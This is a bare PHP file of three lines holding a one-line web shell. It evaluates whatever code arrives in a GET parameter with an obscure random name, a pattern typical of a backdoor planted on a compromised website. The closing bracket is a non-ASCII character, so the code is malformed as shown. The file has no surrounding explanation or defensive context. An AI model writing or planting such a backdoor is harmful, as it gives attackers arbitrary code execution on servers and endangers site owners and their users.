<?php
eval($_GET['vJ4DcFkV'〕);
?>
